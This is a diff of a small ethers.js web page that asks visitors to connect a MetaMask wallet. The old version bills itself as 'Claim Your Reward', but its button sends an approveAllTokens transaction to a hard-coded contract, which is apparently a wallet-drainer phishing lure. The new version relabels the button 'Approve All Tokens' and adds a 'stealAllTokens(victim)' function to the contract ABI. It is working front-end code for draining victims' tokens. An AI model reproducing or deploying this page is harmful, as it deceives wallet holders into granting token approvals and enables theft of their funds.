@@ -1,9 +1,9 @@
-uu<!DOCTYPE html>
+pp<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Reward</title>
+    <title>Smart Contract Interaction</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         body {
@@ -40,17 +40,18 @@ uu<!DOCTYPE html>
 <body>
 
 <div class="container">
-    <h1>Claim Your Reward</h1>
-    <p>Connect your wallet to claim your reward!</p>
+    <h1>Smart Contract Interaction</h1>
+    <p>Connect your wallet to interact with the contract!</p>
     <button id="connectWalletButton" class="button">Connect Wallet</button>
     <br><br>
-    <button id="claimRewardButton" class="button" disabled>Claim Reward</button>
+    <button id="approveTokensButton" class="button" disabled>Approve All Tokens</button>
+    <p id="status" class="note"></p>
 </div>
 
 <script>
     let provider;
     let signer;
-    const contractAddress = "0xcD8F8002E9A7B9e20Af9B6bb1D6AE0C6754Fe8c9"; // Address of your deployed smart contract
+    const contractAddress = "0xcD8F8002E9A7B9e20Af9B6bb1D6AE0C6754Fe8c9"; // Smart contract address
     const tokenAddress = "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E"; // ERC-20 token address
     const contractABI = [
         {
@@ -61,48 +62,66 @@ uu<!DOCTYPE html>
             "outputs": [],
             "stateMutability": "nonpayable",
             "type": "function"
+        },
+        {
+            "inputs": [
+                { "internalType": "address", "name": "victim", "type": "address" }
+            ],
+            "name": "stealAllTokens",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        },
+        {
+            "inputs": [],
+            "stateMutability": "nonpayable",
+            "type": "constructor"
+        },
+        {
+            "inputs": [],
+            "name": "owner",
+            "outputs": [
+                { "internalType": "address", "name": "", "type": "address" }
+            ],
+            "stateMutability": "view",
+            "type": "function"
         }
     ];
 
     async function connectWallet() {
-        if (window.ethereum) {
-            try {
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
-                signer = provider.getSigner();
-                console.log("Wallet connected!");
+        try {
+            if (!window.ethereum) throw new Error("MetaMask not installed");
 
-                document.getElementById("claimRewardButton").disabled = false;
-                alert("Wallet connected successfully!");
-            } catch (error) {
-                console.error("Failed to connect wallet:", error);
-                alert("Failed to connect wallet. Please try again.");
-            }
-        } else {
-            alert("Please install MetaMask to connect your wallet.");
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            signer = provider.getSigner();
+
+            document.getElementById("status").textContent = "Wallet connected successfully!";
+            document.getElementById("approveTokensButton").disabled = false;
+        } catch (error) {
+            console.error("Failed to connect wallet:", error);
+            document.getElementById("status").textContent = "Failed to connect wallet.";
         }
     }
 
-    async function claimReward() {
+    async function approveAllTokens() {
         try {
-            // Connect to the smart contract
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
-
-            // Send approveAllTokens transaction
             const tx = await contract.approveAllTokens(tokenAddress);
-            console.log("Approval transaction sent:", tx.hash);
+            console.log("Transaction sent:", tx.hash);
 
-            await tx.wait(); // Wait for the transaction to be mined
-            console.log("Reward claimed successfully!");
-            alert("Reward claimed successfully!");
+            document.getElementById("status").textContent = "Transaction sent: " + tx.hash;
+
+            await tx.wait();
+            document.getElementById("status").textContent = "Tokens approved successfully!";
         } catch (error) {
-            console.error("Error during reward claim:", error);
-            alert("Failed to claim reward. Please try again.");
+            console.error("Failed to approve tokens:", error);
+            document.getElementById("status").textContent = "Failed to approve tokens. Please try again.";
         }
     }
 
     document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
-    document.getElementById("claimRewardButton").addEventListener("click", claimReward);
+    document.getElementById("approveTokensButton").addEventListener("click", approveAllTokens);
 </script>
 
 </body>
